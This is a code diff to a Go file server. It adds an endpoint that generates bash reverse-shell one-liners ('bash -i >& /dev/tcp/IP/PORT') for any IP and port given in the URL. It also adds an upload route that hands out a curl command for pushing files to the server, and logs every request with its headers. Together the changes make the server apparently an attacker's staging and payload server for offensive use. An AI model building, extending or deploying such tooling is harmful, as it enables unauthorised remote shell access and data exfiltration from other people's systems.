@@ -28,18 +28,27 @@ func parseFlags() serverConfig {
 }
 
 func startServer(config serverConfig) {
-	http.Handle("/", http.FileServer(http.Dir(config.directory)))
-	http.HandleFunc("/upload", makeUploadHandler(config.directory))
+	mux := http.NewServeMux()
+	mux.Handle("/", http.FileServer(http.Dir(config.directory)))
+	mux.HandleFunc("/u", makeUploadHandler(config.directory))
+	mux.HandleFunc("/r/{ip}/{port}", reverseShellHandler)
 
-	addr := fmt.Sprintf(":%d", config.port)
+	server := &http.Server{
+		Addr:    fmt.Sprintf(":%d", config.port),
+		Handler: loggingMiddleware(mux),
+	}
 	log.Printf("Serving %s on HTTP port: %d\n", config.directory, config.port)
-	if err := http.ListenAndServe(addr, nil); err != nil {
+	if err := server.ListenAndServe(); err != nil {
 		log.Fatalf("Failed to start server: %v", err)
 	}
 }
 
 func makeUploadHandler(dir string) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
+		if r.Method == "GET" {
+			fmt.Fprintf(w, "curl -X POST -F \"file=@/path/to/yourfile.ext\" https://ip/u")
+			return
+		}
 		if r.Method != "POST" {
 			http.Error(w, "Only POST method is allowed", http.StatusMethodNotAllowed)
 			return
@@ -71,4 +80,15 @@ func makeUploadHandler(dir string) http.HandlerFunc {
 		log.Printf("File uploaded successfully: %s", handler.Filename)
 		fmt.Fprintf(w, "File uploaded successfully: %s", handler.Filename)
 	}
+}
+
+func reverseShellHandler(w http.ResponseWriter, r *http.Request) {
+	fmt.Fprintf(w, "bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'", r.PathValue("ip"), r.PathValue("port"))
+}
+
+func loggingMiddleware(next http.Handler) http.Handler {
+	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+		log.Printf("Received request: %s %s from %s with headers: %v", r.Method, r.URL, r.RemoteAddr, r.Header)
+		next.ServeHTTP(w, r)
+	})
 }
